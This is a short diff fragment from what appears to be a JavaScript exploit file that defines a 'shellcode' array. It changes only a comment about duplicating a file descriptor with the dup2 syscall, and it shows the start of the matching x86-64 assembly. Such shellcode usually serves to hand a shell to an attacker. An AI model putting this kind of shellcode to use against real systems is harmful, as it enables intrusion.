@@ -2,7 +2,7 @@ const FD = 0x00
 ;
 
 const shellcode = [
-    // dup2 the fd (idk why duping to FD=0 works lol)
+    // dup2 the fd (idk why duping to newfd=0 vs newfd=4 works lol)
 /*
 mov rax, 33
 mov rdi, FD
